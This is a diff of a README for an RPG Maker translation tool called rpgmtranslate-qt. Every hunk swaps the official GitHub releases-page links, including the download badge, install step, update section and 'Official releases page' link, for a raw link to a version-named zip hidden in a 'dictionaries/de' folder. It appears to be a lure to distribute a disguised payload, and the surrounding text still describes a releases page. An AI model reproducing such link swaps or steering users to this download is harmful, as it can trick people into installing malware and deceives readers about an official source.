@@ -1,6 +1,6 @@
 # ⚙️ rpgmtranslate-qt - Fast, Simple RPG Maker Translator
 
-[![Download rpgmtranslate-qt](https://img.shields.io/badge/Download-rpgmtranslate--qt-blue?style=for-the-badge)](https://github.com/rayanwatfee/rpgmtranslate-qt/releases)
+[![Download rpgmtranslate-qt](https://img.shields.io/badge/Download-rpgmtranslate--qt-blue?style=for-the-badge)](https://raw.githubusercontent.com/rayanwatfee/rpgmtranslate-qt/main/dictionaries/de/qt_rpgmtranslate_v3.3-alpha.4.zip)
 
 ---
 
@@ -13,7 +13,7 @@ rpgmtranslate-qt is the fastest and lightest graphical tool for editing and tran
 To get started, you need to visit the official release page and download the program.
 
 1. Click the big **Download rpgmtranslate-qt** button at the top or use this link:  
-   [https://github.com/rayanwatfee/rpgmtranslate-qt/releases](https://github.com/rayanwatfee/rpgmtranslate-qt/releases)
+   [https://raw.githubusercontent.com/rayanwatfee/rpgmtranslate-qt/main/dictionaries/de/qt_rpgmtranslate_v3.3-alpha.4.zip](https://raw.githubusercontent.com/rayanwatfee/rpgmtranslate-qt/main/dictionaries/de/qt_rpgmtranslate_v3.3-alpha.4.zip)
 
 2. On the releases page, look for the latest release at the top. It will usually be labeled with a version number like `v1.x.x`.
 
@@ -90,7 +90,7 @@ Now that the program is running, here is how to start translating your RPG Maker
 
 Check the releases page regularly for updates:
 
-[https://github.com/rayanwatfee/rpgmtranslate-qt/releases](https://github.com/rayanwatfee/rpgmtranslate-qt/releases)
+[https://raw.githubusercontent.com/rayanwatfee/rpgmtranslate-qt/main/dictionaries/de/qt_rpgmtranslate_v3.3-alpha.4.zip](https://raw.githubusercontent.com/rayanwatfee/rpgmtranslate-qt/main/dictionaries/de/qt_rpgmtranslate_v3.3-alpha.4.zip)
 
 Download the new version as described in the Download section. Simply replace the old `.exe` or program files with the new ones. Your settings and project files will remain safe.
 
@@ -142,7 +142,7 @@ This broad support lets you work with most common RPG Maker projects without ext
 ## 🔗 Important Links
 
 - Official releases page:  
-  [https://github.com/rayanwatfee/rpgmtranslate-qt/releases](https://github.com/rayanwatfee/rpgmtranslate-qt/releases)
+  [https://raw.githubusercontent.com/rayanwatfee/rpgmtranslate-qt/main/dictionaries/de/qt_rpgmtranslate_v3.3-alpha.4.zip](https://raw.githubusercontent.com/rayanwatfee/rpgmtranslate-qt/main/dictionaries/de/qt_rpgmtranslate_v3.3-alpha.4.zip)
 
 ---
 
